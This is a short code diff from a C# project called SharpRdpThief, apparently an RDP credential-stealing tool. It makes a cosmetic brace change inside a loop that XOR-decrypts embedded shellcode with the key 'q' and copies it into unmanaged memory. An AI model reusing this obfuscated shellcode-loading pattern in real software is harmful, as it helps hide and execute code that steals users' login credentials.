@@ -134,9 +134,7 @@ namespace SharpRdpThief
 
                             // XOR-decrypt the shellcode
                             for (int j = 0; j < rDllRawBytes.Length; j++)
-                            {
                                 rDllRawBytes[j] = (byte)(rDllRawBytes[j] ^ (byte)'q');
-                            }
 
                             var buffer = Marshal.AllocHGlobal(rDllRawBytes.Length);
                             Marshal.Copy(rDllRawBytes, 0, buffer, rDllRawBytes.Length);
